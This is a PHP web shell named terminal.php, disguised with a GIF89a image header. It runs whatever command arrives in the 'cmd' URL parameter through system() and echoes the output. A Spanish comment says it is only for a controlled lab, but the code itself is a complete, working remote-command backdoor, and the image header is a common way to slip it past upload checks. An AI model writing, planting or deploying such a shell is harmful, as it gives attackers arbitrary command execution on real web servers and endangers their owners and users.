GIF89a
<?php
// terminal.php - SOLO PARA LABORATORIO CONTROLADO

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    echo "<h2>Comando ejecutado:</h2>";
    echo "<pre>" . htmlspecialchars($cmd) . "</pre>";

    echo "<h2>Resultado:</h2>";
    echo "<pre>";
    system($cmd . " 2>&1");
    echo "</pre>";
} else {
    echo "Uso: terminal.php?cmd=whoami";
}
?>
